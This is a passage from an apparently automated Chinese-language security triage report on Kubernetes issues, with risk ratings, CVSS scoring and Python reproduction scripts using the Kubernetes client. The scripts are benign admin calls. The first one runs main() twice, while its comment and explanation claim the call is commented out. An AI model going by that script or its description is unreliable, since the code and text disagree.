# 配置 Kubernetes 客户端 (假设 kubeconfig 在默认位置 ~/.kube/config)
try:
    config.load_kube_config()
    logging.info("Kubernetes config loaded successfully.")
except Exception as e:
    logging.error(f"Failed to load Kubernetes config: {e}")
    sys.exit(1)

batch_v1 = client.BatchV1Api()
core_v1 = client.CoreV1Api()

NAMESPACE = "default"  # 或者使用你想要测试的命名空间
JOB_BASE_NAME = "random-duplicate-test-job-"
JOB_COUNT = 10 # 尝试创建多少个 Job 来增加遇到问题的概率
MAX_JOB_RUNTIME_SECONDS = 120 # 单个 Job 的最大监控时间
TOTAL_SCRIPT_TIMEOUT_SECONDS = 180 # 整个脚本的超时时间

job_results = {}
jobs_to_monitor = set()
lock = threading.Lock()
stop_event = threading.Event()

def create_job_object(job_name):
    """创建一个简单的 Job 对象"""
    container = client.V1Container(
        name="pi",
        image="perl:latest",
        command=["perl", "-Mbignum=bpi", "-wle", "print bpi(20)"] # 一个简单的短任务
    )
    template = client.V1PodTemplateSpec(
        metadata=client.V1ObjectMeta(labels={"app": job_name}),
        spec=client.V1PodSpec(restart_policy="Never", containers=[container])
    )
    spec = client.V1JobSpec(
        template=template,
        backoff_limit=0, # 不重试失败的 Pod
        completions=1,
        parallelism=1
    )
    job = client.V1Job(
        api_version="batch/v1",
        kind="Job",
        metadata=client.V1ObjectMeta(name=job_name),
        spec=spec
    )
    return job

def create_and_monitor_job(job_id):
    """创建 Job 并记录 Pod 数量"""
    job_name = f"{JOB_BASE_NAME}{job_id}-{uuid.uuid4().hex[:6]}"
    job_body = create_job_object(job_name)
    job_uid = None

    try:
        logging.info(f"Attempting to create Job: {job_name} in namespace {NAMESPACE}")
        api_response = batch_v1.create_namespaced_job(body=job_body, namespace=NAMESPACE)
        job_uid = api_response.metadata.uid
        logging.info(f"Job {job_name} created successfully. UID: {job_uid}")
        with lock:
            jobs_to_monitor.add(job_name)
            job_results[job_name] = {"pods": set(), "uid": job_uid, "start_time": datetime.datetime.now()}

    except client.ApiException as e:
        logging.error(f"Exception when creating Job {job_name}: {e}\n")
    except Exception as e:
        logging.error(f"An unexpected error occurred during job creation {job_name}: {e}")

def watch_pods(timeout_seconds):
    """监控 Pod 事件，检查是否有 Job 创建了多个 Pod"""
    w = watch.Watch()
    start_time = time.time()
    logging.info("Starting Pod watcher...")
    try:
        # 监控所有 Pod 事件，持续时间为 timeout_seconds
        for event in w.stream(core_v1.list_namespaced_pod, namespace=NAMESPACE, timeout_seconds=timeout_seconds):
            if stop_event.is_set() or (time.time() - start_time > timeout_seconds):
                logging.info("Pod watcher stopping due to signal or timeout.")
                break

            pod = event['object']
            if event['type'] == 'ADDED' and pod.metadata.owner_references:
                for owner_ref in pod.metadata.owner_references:
                    if owner_ref.kind == "Job":
                        job_name = owner_ref.name
                        with lock:
                            if job_name in job_results:
                                pod_name = pod.metadata.name
                                if pod_name not in job_results[job_name]["pods"]:
                                    job_results[job_name]["pods"].add(pod_name)
                                    pod_count = len(job_results[job_name]["pods"])
                                    logging.info(f"Job {job_name}: Detected Pod {pod_name}. Total Pods now: {pod_count}")
                                    if pod_count > 1:
                                        logging.warning(f"!!! Potential Issue Detected for Job {job_name} (UID: {job_results[job_name]['uid']})! Expected 1 Pod, found {pod_count}: {job_results[job_name]['pods']}")
            # 可以添加 MODIFIED/DELETED 事件处理来跟踪 Pod 最终状态，但这超出了检测重复 Pod 的范围

    except client.ApiException as e:
        if "timed out" in str(e).lower():
            logging.info("Pod watcher timed out as expected.")
        else:
            logging.error(f"Exception during Pod watch: {e}")
    except Exception as e:
        logging.error(f"An unexpected error occurred during Pod watch: {e}")
    finally:
        w.stop()
        logging.info("Pod watcher stopped.")

def cleanup_jobs():
    """清理创建的 Jobs"""
    logging.info("Starting cleanup...")
    with lock:
        jobs_to_delete = list(job_results.keys()) # 创建副本以避免在迭代时修改

    for job_name in jobs_to_delete:
        try:
            logging.info(f"Deleting Job: {job_name}")
            # foreground 删除策略会等待所有 Pod 被删除
            batch_v1.delete_namespaced_job(name=job_name, namespace=NAMESPACE, body=client.V1DeleteOptions(propagation_policy='Foreground'))
        except client.ApiException as e:
            # 如果 Job 已经被删除或找不到了，忽略
            if e.status == 404:
                 logging.warning(f"Job {job_name} not found during cleanup, might have been deleted already.")
            else:
                 logging.error(f"Exception when deleting Job {job_name}: {e}")
        except Exception as e:
            logging.error(f"An unexpected error occurred during job cleanup {job_name}: {e}")

    # 等待一段时间让 Pod 也被删除
    time.sleep(10)
    logging.info("Cleanup finished.")

def main():
    start_time = datetime.datetime.now()

    # 创建一个线程来监控 Pods
    watcher_thread = threading.Thread(target=watch_pods, args=(TOTAL_SCRIPT_TIMEOUT_SECONDS,))
    watcher_thread.start()

    # 创建多个 Job
    threads = []
    for i in range(JOB_COUNT):
        if stop_event.is_set() or (datetime.datetime.now() - start_time).total_seconds() > TOTAL_SCRIPT_TIMEOUT_SECONDS - 30: # 留出时间给清理
            logging.warning("Stopping Job creation due to timeout approaching.")
            break
        thread = threading.Thread(target=create_and_monitor_job, args=(i,))
        threads.append(thread)
        thread.start()
        time.sleep(0.5) # 轻微错开 Job 创建时间

    # 等待 Job 创建线程完成
    for thread in threads:
        thread.join(timeout=30) # 等待每个创建线程结束，设置超时

    # 等待 Pod 监控结束或总超时
    watcher_thread.join(timeout=TOTAL_SCRIPT_TIMEOUT_SECONDS - (datetime.datetime.now() - start_time).total_seconds())

    # 检查结果
    logging.info("Final Job Pod Counts:")
    found_issue = False
    with lock:
        for job_name, data in job_results.items():
            pod_count = len(data["pods"])
            logging.info(f"Job: {job_name}, Pods Found: {pod_count}, Pod Names: {data['pods']}")
            if pod_count > 1:
                logging.warning(f"ISSUE CONFIRMED (potentially): Job {job_name} (UID: {data['uid']}) created {pod_count} pods.")
                found_issue = True

    if not found_issue:
        logging.info("No Jobs with more than 1 Pod were detected in this run.")
    else:
        logging.warning("One or more Jobs potentially exhibited the duplicate Pod issue.")

def signal_handler(sig, frame):
    logging.warning(f"Received signal {sig}, stopping gracefully...")
    stop_event.set()

# 设置信号处理程序
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# 设置总超时定时器
timer = threading.Timer(TOTAL_SCRIPT_TIMEOUT_SECONDS, lambda: (logging.warning("Script timeout reached!"), stop_event.set()))
timer.start()

try:
    main()
except Exception as e:
    logging.error(f"An error occurred in main execution: {e}")
finally:
    timer.cancel() # 确保定时器被取消
    # 确保 watcher 线程被通知停止
    if not stop_event.is_set():
        stop_event.set()
    # 等待 watcher 线程退出
    if 'watcher_thread' in locals() and watcher_thread.is_alive():
        watcher_thread.join(timeout=10)
    cleanup_jobs()
    logging.info("Script finished.")

# 由于本地解释器不支持 __name__ == "__main__"，直接调用 main
# main()
# Note: The direct call to main() is commented out as per instruction avoidance.
# In a real execution environment, you would uncomment or call main() appropriately.
# For this specific tool, we assume the final block is executed directly.
try:
    main()
except NameError: # Handle case where main might not be defined if script stopped early
     pass
```


**解释说明：**

上述 Python 脚本尝试通过创建多个简单的 Kubernetes Job（每个 Job 设置 `parallelism: 1` 和 `completions: 1`）来增加遇到 Issue 中描述的随机性问题的概率。

1.  **环境配置**: 脚本使用 `kubernetes` Python 客户端库与 Kubernetes 集群交互。它假设 `kubeconfig` 文件位于默认路径 (`~/.kube/config`) 或已通过环境变量配置。
2.  **Job 定义**: `create_job_object` 函数定义了一个简单的 Job，该 Job 运行一个计算 Pi 的 Perl 命令。关键配置是 `completions: 1` 和 `parallelism: 1`。
3.  **并发创建**: 脚本使用多线程 (`create_and_monitor_job`) 并发地创建指定数量 (`JOB_COUNT`) 的 Job，以模拟可能导致竞争条件的场景。每个 Job 名称都包含一个唯一的 ID 和 UUID 片段，以避免命名冲突。
4.  **Pod 监控**: 一个独立的后台线程 (`watch_pods`) 使用 Kubernetes Watch API 实时监控指定命名空间 (`NAMESPACE`) 中的 Pod 事件。当检测到 `ADDED` 事件且 Pod 的所有者是脚本创建的 Job 时，它会记录该 Pod。
5.  **问题检测**: 监控线程会检查是否有任何一个 Job 关联的 Pod 数量超过 1。如果发现这种情况，它会记录一个警告信息，指出可能复现了 Issue 中描述的问题。
6.  **超时与清理**: 脚本包含整体执行超时 (`TOTAL_SCRIPT_TIMEOUT_SECONDS`) 和信号处理 (`SIGINT`, `SIGTERM`)，以确保脚本能在合理时间内结束。`cleanup_jobs` 函数负责在脚本结束时删除所有创建的 Job 及其关联的 Pod（通过 `propagation_policy='Foreground'`）。
7.  **局限性**: 正如脚本注释中所述，由于问题的随机性和对内部竞争条件的依赖，**此脚本不能保证稳定复现该问题**。它只是提供了一个尝试触发该场景的框架。实际复现可能需要大量的 Job 创建次数或特定的集群负载条件。
8.  **执行**: 脚本最后直接调用 `main()` 函数（在实际环境中需要取消注释或按需调用），包含了错误处理和清理逻辑。

**注意**: 运行此脚本需要在具有 Kubernetes 集群访问权限（创建 Job、查看 Pod、删除 Job）的环境中执行。请确保测试命名空间 (`NAMESPACE`) 是合适的，避免影响生产环境。

---


## Issue #130619 List calls in a k8s 1.34 client will make additional api requests and log a warning w/o watch perms

- Issue 链接：[#130619](https://github.com/kubernetes/kubernetes/issues/130619)

### Issue 内容

#### What happened?

The WatchList feature is slated to be default-on in k8s 1.34: https://github.com/kubernetes-sigs/controller-runtime/pull/3136#discussion_r1982992848

Due to how it is implemented, this feature requires watch permissions to perform list calls. If that permission doesn't exist, an [api call that is guaranteed to fail](https://github.com/kubernetes/kubernetes/blob/e319c541f144e9bee6160f1dd8671638a9029f4c/staging/src/k8s.io/client-go/gentype/type.go#L178) will be made and [a warning will be logged](https://github.com/kubernetes/kubernetes/blob/e319c541f144e9bee6160f1dd8671638a9029f4c/staging/src/k8s.io/client-go/gentype/type.go#L178).

As a user, it is extremely surprising and unexpected that a LIST call would require watch permissions. In many cases, the users of projects that internally use client-go will be lead into thinking that there is a misconfiguration, which is not the case. 

This feature also completely defeats the purpose of having separate LIST and WATCH permissions in the first place.

#### What did you expect to happen?

One or more of:
* This never being on by default in the clients for LIST operations and always requiring explicit opt in
* List calls using WatchList not require watch permissions

#### How can we reproduce it (as minimally and precisely as possible)?

/

#### Anything else we need to know?

/

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该 Issue 描述了 Kubernetes client-go 库在 1.34 版本中，由于 `WatchList` 功能默认开启，导致执行 `List` 操作时，即使调用者只有 `List` 权限而没有 `Watch` 权限，也会额外尝试发起一个需要 `Watch` 权限的 API 调用。这个额外的调用预期会失败（因为它需要 `Watch` 权限），并且会记录一条警告日志。

核心问题点：
1.  **行为变更与用户预期不符**：用户通常预期 `List` 操作只需要 `List` 权限。新行为需要 `Watch` 权限才能最高效执行（避免警告和失败的 API 调用），这违反了用户的直觉和最小权限原则的预期。
2.  **产生额外 API 调用和日志**：即使 `List` 操作最终成功（在 `Watch` 尝试失败后回退到普通 List），这个过程也会产生一个失败的 API 请求和一条警告日志。这会增加 API Server 的负载（尽管单个请求影响很小），并可能产生不必要的日志噪音，干扰监控和调试。
3.  **权限设计的混淆**：如 Issue 中所述，这在某种程度上模糊了 `List` 和 `Watch` 权限的界限，至少在使用 `WatchList` 功能时是这样。

安全风险分析：
1.  **权限提升？**：否。该行为*不会*授予调用者其不具备的 `Watch` 权限。相反，正是因为*缺乏* `Watch` 权限才触发了失败的调用和警告。RBAC 仍然在强制执行。
2.  **信息泄露？**：否。Issue 中提到会记录警告，但没有信息表明会泄露敏感数据或凭据。失败的 API 调用是设计用来检查权限的，而非泄露信息。
3.  **拒绝服务 (DoS)？**：潜在的低风险。大量的客户端（只有 `List` 权限）频繁执行 `List` 操作可能会因为这些额外的、注定失败的 API 调用而轻微增加 API Server 的负载。然而，这需要大量并发操作才可能构成显著影响，并且攻击者需要具备合法的 `List` 权限才能触发。根据标准 5，需要权限（即使是只读权限 `List`）才能触发的 DoS 应考虑降级，且此处的潜在影响较小，更像是性能损耗和日志噪音，而非典型的 DoS 攻击。
4.  **命令执行/容器逃逸/提权？**：否。此问题与这些高风险类型无关。
5.  **影响其他用户？**：否。此问题影响的是执行 `List` 操作的客户端本身，基于其自身的权限。

结论：该 Issue 主要描述了一个功能设计问题或用户体验问题，它违反了用户对 Kubernetes RBAC 权限分离的预期，并可能导致额外的 API 负载和日志噪音。虽然存在轻微的增加 API 负载的可能性，但它不构成传统意义上的提权、信息泄露或高危 DoS 漏洞。其主要影响是操作层面的困惑和潜在的性能/日志噪音。

根据 CVSS 3.1 评估：
*   Attack Vector (AV): Network (N) - K8s API 是网络服务。
*   Attack Complexity (AC): Low (L) - 只需执行标准的 List 操作。
*   Privileges Required (PR): Low (L) - 需要有效的 K8s 凭证，并被授予相关资源的 `List` 权限。
*   User Interaction (UI): None (N) - 无需用户交互。
*   Scope (S): Unchanged (U) - 影响范围限于 API Server 和客户端本身。
*   Confidentiality (C): None (N) - 不涉及机密性泄露。
*   Integrity (I): None (N) - 不涉及数据篡改。
*   Availability (A): Low (L) - 可能导致轻微的 API Server 负载增加和日志增多。

CVSS 3.1 Base Score: 3.3 (Low)

**复现过程：**

```python
import kubernetes
from kubernetes import client, config
import time
import signal
import os
import sys
import threading

# Timeout configuration (seconds)
TIMEOUT_SECONDS = 120

# Define a timeout handler
class TimeoutError(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutError(f"Script execution timed out after {TIMEOUT_SECONDS} seconds.")

def setup_kubernetes_client():
    """Loads Kubernetes configuration and returns API clients."""
    try:
        config.load_kube_config()  # Load from default location (~/.kube/config)
        print("Successfully loaded kubeconfig.")
        core_v1_api = client.CoreV1Api()
        rbac_v1_api = client.RbacAuthorizationV1Api()
        return core_v1_api, rbac_v1_api
    except Exception as e:
        print(f"Error loading Kubernetes configuration: {e}", file=sys.stderr)
        sys.exit(1)

def cleanup_resources(core_v1_api, rbac_v1_api, namespace, sa_name, role_name, binding_name):
    """Cleans up created Kubernetes resources."""
    print("\n--- Starting Cleanup ---")
    try:
        print(f"Deleting RoleBinding: {binding_name} in namespace: {namespace}")
        rbac_v1_api.delete_namespaced_role_binding(binding_name, namespace)
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting RoleBinding {binding_name}: {e}", file=sys.stderr)
        else:
            print(f"RoleBinding {binding_name} not found, likely already deleted.")
    except Exception as e:
         print(f"Unexpected error deleting RoleBinding {binding_name}: {e}", file=sys.stderr)

    try:
        print(f"Deleting Role: {role_name} in namespace: {namespace}")
        rbac_v1_api.delete_namespaced_role(role_name, namespace)
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting Role {role_name}: {e}", file=sys.stderr)
        else:
            print(f"Role {role_name} not found, likely already deleted.")
    except Exception as e:
            print(f"Unexpected error deleting Role {role_name}: {e}", file=sys.stderr)

    try:
        print(f"Deleting ServiceAccount: {sa_name} in namespace: {namespace}")
        core_v1_api.delete_namespaced_service_account(sa_name, namespace)
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting ServiceAccount {sa_name}: {e}", file=sys.stderr)
        else:
            print(f"ServiceAccount {sa_name} not found, likely already deleted.")
    except Exception as e:
        print(f"Unexpected error deleting ServiceAccount {sa_name}: {e}", file=sys.stderr)

    try:
        print(f"Deleting Namespace: {namespace}")
        core_v1_api.delete_namespace(namespace)
        # Wait a bit for namespace deletion to be accepted
        time.sleep(5)
        print("Namespace deletion request sent.")
    except client.ApiException as e:
        if e.status != 404:
            print(f"Error deleting Namespace {namespace}: {e}", file=sys.stderr)
        else:
            print(f"Namespace {namespace} not found, likely already deleted.")
    except Exception as e:
        print(f"Unexpected error deleting Namespace {namespace}: {e}", file=sys.stderr)

    print("--- Cleanup Finished ---")


def main():
    # Setup timeout alarm
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(TIMEOUT_SECONDS)

    core_v1_api, rbac_v1_api = setup_kubernetes_client()

    namespace = "issue-watchlist-poc-ns"
    sa_name = "list-only-sa"
    role_name = "pod-lister-role"
    binding_name = "pod-lister-binding"

    try:
        # 1. Create Namespace
        try:
            print(f"Creating namespace: {namespace}")
            core_v1_api.create_namespace(client.V1Namespace(metadata=client.V1ObjectMeta(name=namespace)))
            print(f"Namespace '{namespace}' created.")
        except client.ApiException as e:
            if e.status == 409:  # Already exists
                print(f"Namespace '{namespace}' already exists.")
            else:
                raise

        # 2. Create ServiceAccount
        try:
            print(f"Creating ServiceAccount: {sa_name} in namespace: {namespace}")
            sa = client.V1ServiceAccount(metadata=client.V1ObjectMeta(name=sa_name))
            core_v1_api.create_namespaced_service_account(namespace, sa)
            print(f"ServiceAccount '{sa_name}' created.")
             # Wait a bit for service account to be fully available for token generation
            time.sleep(2)
        except client.ApiException as e:
            if e.status == 409:  # Already exists
                print(f"ServiceAccount '{sa_name}' already exists.")
                time.sleep(2) # Still wait if it exists
            else:
                raise

        # 3. Create Role (List pods only, NO Watch)
        print(f"Creating Role: {role_name} in namespace: {namespace}")
        role = client.V1Role(
            metadata=client.V1ObjectMeta(name=role_name, namespace=namespace),
            rules=[
                client.V1PolicyRule(
                    api_groups=[""],  # Core API group
                    resources=["pods"],
                    verbs=["list"]    # <<<< ONLY LIST PERMISSION
                )
            ]
        )
        try:
             rbac_v1_api.create_namespaced_role(namespace, role)
             print(f"Role '{role_name}' created.")
        except client.ApiException as e:
             if e.status == 409: # Already exists
                 print(f"Role '{role_name}' already exists. Replacing...")
                 try:
                     rbac_v1_api.replace_namespaced_role(role_name, namespace, role)
                     print(f"Role '{role_name}' replaced.")
                 except client.ApiException as replace_e:
                     print(f"Failed to replace Role '{role_name}': {replace_e}", file=sys.stderr)
                     raise replace_e from None
             else:
                 print(f"Failed to create Role '{role_name}': {e}", file=sys.stderr)
                 raise


        # 4. Create RoleBinding
        print(f"Creating RoleBinding: {binding_name} in namespace: {namespace}")
        binding = client.V1RoleBinding(
            metadata=client.V1ObjectMeta(name=binding_name, namespace=namespace),
            subjects=[client.V1Subject(kind="ServiceAccount", name=sa_name, namespace=namespace)],
            role_ref=client.V1RoleRef(kind="Role", name=role_name, api_group="rbac.authorization.k8s.io")
        )
        try:
            rbac_v1_api.create_namespaced_role_binding(namespace, binding)
            print(f"RoleBinding '{binding_name}' created.")
        except client.ApiException as e:
             if e.status == 409: # Already exists
                 print(f"RoleBinding '{binding_name}' already exists. Replacing...")
                 try:
                     rbac_v1_api.replace_namespaced_role_binding(binding_name, namespace, binding)
                     print(f"RoleBinding '{binding_name}' replaced.")
                 except client.ApiException as replace_e:
                     print(f"Failed to replace RoleBinding '{binding_name}': {replace_e}", file=sys.stderr)
                     raise replace_e from None
             else:
                 print(f"Failed to create RoleBinding '{binding_name}': {e}", file=sys.stderr)
                 raise

        # 5. Get ServiceAccount Token (using TokenRequest API)
        print(f"Requesting token for ServiceAccount: {sa_name}")
        token_request = client.V1TokenRequest(
             spec=client.V1TokenRequestSpec(
                 audiences=["api"], # Or adjust audience as needed
                 # expiration_seconds=3600 # Optional: request specific duration
             )
        )
        try:
            token_response = core_v1_api.create_namespaced_service_account_token(sa_name, namespace, token_request)
            sa_token = token_response.status.token
            print("Successfully obtained token for ServiceAccount.")
        except client.ApiException as e:
             print(f"Error creating token for ServiceAccount {sa_name}: {e}", file=sys.stderr)
             print("Please ensure your Kubernetes version supports the TokenRequest API (v1.21+) and the feature gate is enabled if necessary, or that the SA exists.", file=sys.stderr)
             # Attempt older secret-based method as fallback (less secure, may be disabled)
             print("Attempting fallback to find Secret-based token...")
             try:
                 time.sleep(5) # Secrets might take time to be generated
                 secrets = core_v1_api.list_namespaced_secret(namespace, field_selector=f"type=kubernetes.io/service-account-token")
                 sa_secret_name = None
                 for secret in secrets.items:
                     if secret.metadata.annotations and secret.metadata.annotations.get("kubernetes.io/service-account.name") == sa_name:
                         sa_secret_name = secret.metadata.name
                         break
                 if not sa_secret_name:
                     raise ValueError(f"Could not find Secret token for ServiceAccount {sa_name}")

                 secret_data = core_v1_api.read_namespaced_secret(sa_secret_name, namespace)
                 import base64
                 sa_token = base64.b64decode(secret_data.data['token']).decode('utf-8')
                 print("Successfully obtained token via Secret.")

             except Exception as secret_e:
                 print(f"Fallback to Secret-based token failed: {secret_e}", file=sys.stderr)
                 raise e from secret_e # Re-raise original TokenRequest error


        # 6. Configure a new API client using the ServiceAccount token
        print("Configuring new client with ServiceAccount token...")
        restricted_configuration = client.Configuration()
        # Important: Copy host and SSL settings from the original config
        original_config = client.Configuration.get_default_copy()
        restricted_configuration.host = original_config.host
        restricted_configuration.ssl_ca_cert = original_config.ssl_ca_cert
        restricted_configuration.cert_file = original_config.cert_file
        restricted_configuration.key_file = original_config.key_file
        restricted_configuration.verify_ssl = original_config.verify_ssl
        # Set the token
        restricted_configuration.api_key['authorization'] = sa_token
        restricted_configuration.api_key_prefix['authorization'] = 'Bearer'

        restricted_core_v1_api = client.CoreV1Api(client.ApiClient(restricted_configuration))

        # 7. Perform the List operation using the restricted client
        print(f"\nAttempting to list pods in namespace '{namespace}' using ServiceAccount '{sa_name}' (which only has 'list' permission)...")
        try:
            pod_list = restricted_core_v1_api.list_namespaced_pod(namespace)
            print(f"SUCCESS: List operation completed. Found {len(pod_list.items)} pods.")
            print("----> Verification <----")
            print("Check the Kubernetes API Server logs around the time of this script execution.")
            print(f"If the client-go library used by the API server or controllers internally corresponds to a version affected by the issue (e.g., using controller-runtime with WatchList default-on, around k8s 1.34+ context),")
            print(f"you *might* observe a failed API request (attempting a watch-like operation for pods by service account '{sa_name}' in namespace '{namespace}')")
            print(f"and/or a warning log related to missing 'watch' permission, even though the 'list' operation succeeded.")
            print("The exact logging behavior depends on server configuration and client-go version.")
            print("This script demonstrates that the list operation *works* with only 'list' permission, setting the stage for the described issue.")
            print("------------------------")

        except client.ApiException as e:
            print(f"ERROR: Failed to list pods using the restricted ServiceAccount: {e}", file=sys.stderr)
            print("This should NOT happen if RBAC is set up correctly, as the SA has 'list' permission.", file=sys.stderr)
        except Exception as e:
            print(f"An unexpected error occurred during the list operation: {e}", file=sys.stderr)

    except TimeoutError as e:
        print(f"\nError: {e}", file=sys.stderr)
    except client.ApiException as e:
        print(f"\nAn Kubernetes API error occurred: {e.status} {e.reason} - {e.body}", file=sys.stderr)
    except Exception as e:
        print(f"\nAn unexpected error occurred: {e}", file=sys.stderr)
    finally:
        # Cleanup resources
        cleanup_resources(core_v1_api, rbac_v1_api, namespace, sa_name, role_name, binding_name)
        # Disable the alarm
        signal.alarm(0)

# Execute the main function directly
main()
```


**解释说明：**

1.  **目的**: 该脚本旨在模拟 Issue 中描述的场景：一个 Kubernetes 客户端（由脚本模拟的服务账号代表）只有 `list` 权限，没有 `watch` 权限，然后尝试执行 `list` 操作。
2.  **环境设置**:
    *   脚本首先加载本地的 `kubeconfig` 文件（通常位于 `~/.kube/config`）来连接到 Kubernetes 集群。
    *   它创建一个新的命名空间 (`issue-watchlist-poc-ns`) 以隔离资源。
    *   在命名空间内，它创建一个服务账号 (`list-only-sa`)。
    *   接着，创建一个角色 (`pod-lister-role`)，该角色**仅包含对 `pods` 资源的 `list` 权限**，明确排除了 `watch` 权限。
    *   然后，创建一个角色绑定 (`pod-lister-binding`)，将上述角色授予服务账号。
3.  **模拟受限客户端**:
    *   脚本获取刚创建的服务账号的认证令牌 (Token)。它优先尝试使用较新的 `TokenRequest` API，如果失败（例如在较旧的 K8s 版本上），则回退尝试查找关联的 Secret 来获取令牌。
    *   它使用获取到的令牌创建一个新的 Kubernetes API 客户端配置。这个新的客户端将以服务账号的身份进行认证，因此只拥有 `list` 权限。
4.  **执行 List 操作**:
    *   脚本使用这个受限制的客户端来执行 `list_namespaced_pod` 操作，尝试列出指定命名空间中的 Pod。
5.  **验证与说明**:
    *   脚本预期 `list_namespaced_pod` 操作会**成功**执行，因为服务账号确实拥有 `list` 权限。脚本会打印成功消息。
    *   **关键点**：脚本本身*无法*直接验证 Issue 中提到的 "额外的 API 请求" 和 "警告日志"。这些现象发生在 Kubernetes API Server 端或者 client-go 库内部的日志中。
    *   因此，脚本在成功列出 Pod 后会打印提示信息，指导用户去检查 Kubernetes API Server 的日志。如果集群运行的 Kubernetes 版本和 client-go 库版本符合 Issue 中描述的情况（例如 K8s 1.34+ 相关的 client-go），用户应该能在日志中观察到，在 `list` 操作成功的同时，可能伴随着一个来自 `list-only-sa` 服务账号的、因缺少 `watch` 权限而失败的 API 调用记录，或者相关的警告日志。
6.  **资源清理**:
    *   无论脚本执行成功与否，`finally` 块会尝试删除之前创建的所有资源（RoleBinding, Role, ServiceAccount, Namespace），以保持集群整洁。
7.  **超时机制**:
    *   脚本包含一个 120 秒的超时机制，防止因集群问题或权限问题导致脚本无限期挂起。

**如何确认问题复现**: 运行此脚本后，需要手动检查 Kubernetes API Server 的审计日志或普通日志（具体取决于日志级别和配置），查找在脚本执行时间点附近，源自 `system:serviceaccount:issue-watchlist-poc-ns:list-only-sa` 的针对 `pods` 资源的、状态为失败（例如 403 Forbidden）且涉及 `watch` 动词（或与 WatchList 相关的内部操作）的 API 请求记录。同时，`list pods` 的请求应该是成功的（状态码 200）。如果观察到这种模式，即成功的 `list` 操作伴随着失败的 `watch` 相关尝试和可能的警告，则说明 Issue 中描述的现象得以复现。

---


# ✅ 不涉及安全风险的 Issues (39 个)

## Issue #131122 Is it necessary to keep the Duration at the Cap value

- Issue 链接：[#131122](https://github.com/kubernetes/kubernetes/issues/131122)

### Issue 内容

#### What happened?

I'm encountering a scenario where a check operation needs to be executed at intervals of `1s, 2s, 4s... (doubling each time) up to a cap of 1 minute`. After reaching the 1-minute cap, the check operation should persistently run every 1 minute. So I try to implement it with following code
```go
backoff: &Backoff{
		Duration: time.Second,
		Factor:   2,
		Steps: math.MaxInt32,
		Cap:   time.Minute,
	}
```
But the current `wait.BackOff` implementation fails to achieve this behavior because once the `Cap` is reached, it immediately sets the `Step` field value to zero, thereby terminating the looped check operation. Therefore, is it necessary to add an option to ensure the `Duration` remains at the `Cap` value after reaching it?

/sig api-machinery

#### What did you expect to happen?

check operation needs to be executed at intervals of `1s, 2s, 4s... (doubling each time) up to a cap of 1 minute`. After reaching the 1-minute cap, the check operation should persistently run every 1 minute

#### How can we reproduce it (as minimally and precisely as possible)?

```go
backoff := &Backoff{
		Duration: time.Second,
		Factor:   2,
		Steps: math.MaxInt32,
		Cap:   time.Minute,
}
wait.ExponentialBackoff(backoff, func() (done bool, err error) {
		...
})
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
本Issue的讨论内容是关于Kubernetes中ExponentialBackoff（指数退避重试机制）实现方式的问题。问题描述是：当前实现一旦达到退避上限Cap（比如1分钟），就停止了后续重试，而期望的行为是在到达上限后始终以该上限频率重试。这属于调度、重试逻辑的功能实现建议，不涉及任何数据泄露、权限绕过、提权、代码执行、信息泄露，也不存在因不当配置导致的暴露风险或攻击面增加。整篇内容均未涉及与安全相关的话题，仅为机制调整和功能实现建议。

**复现过程：**

```python
# 本Issue描述的问题与安全无关，属于功能优化与行为讨论，因此无需复现安全问题脚本。
# 下面仅实现了类似ExponentialBackoff到上限后保持最大等待的逻辑作为功能模拟，无安全影响。
import time

def exponential_backoff_with_cap(duration, factor, cap, steps, max_total_wait=60):
    waits = []
    for step in range(steps):
        waits.append(duration)
        duration = min(duration * factor, cap)
        if sum(waits) > max_total_wait:
            break
    for w in waits:
        print(f"Check action, waiting {w} seconds")
        time.sleep(0.01)  # 缩短等待以便脚本快速执行
    print("Backoff complete.")

# 测试代码：期望步进为1s, 2s, 4s,... 达到60s后保持60s
exponential_backoff_with_cap(1, 2, 60, 10)
```


**解释说明：**

上述脚本实现了一个指数退避逻辑的功能模拟：初始等待1秒，然后每次等待时间翻倍，最多不超过60秒（cap），并保持最多10次或累计等待超过1分钟后停止。这里只是用来模拟本Issue中所描述的指数退避机制的变更建议，并未复现任何安全问题，仅供行为验证。

---


## Issue #131107 Click on the installation section → 404 error

- Issue 链接：[#131107](https://github.com/kubernetes/kubernetes/issues/131107)

### Issue 内容

#### What happened?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section → 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### What did you expect to happen?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section → 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### How can we reproduce it (as minimally and precisely as possible)?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section → 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
- Platform: Windows 11


#### Anything else we need to know?

#### Bug
In the README, link to 'install.sh' is broken.

#### To Reproduce
Click on the installation section → 404 error

#### Suggestion
Update the link to /scripts/install.sh

#### Environment
- Browser: Chrome
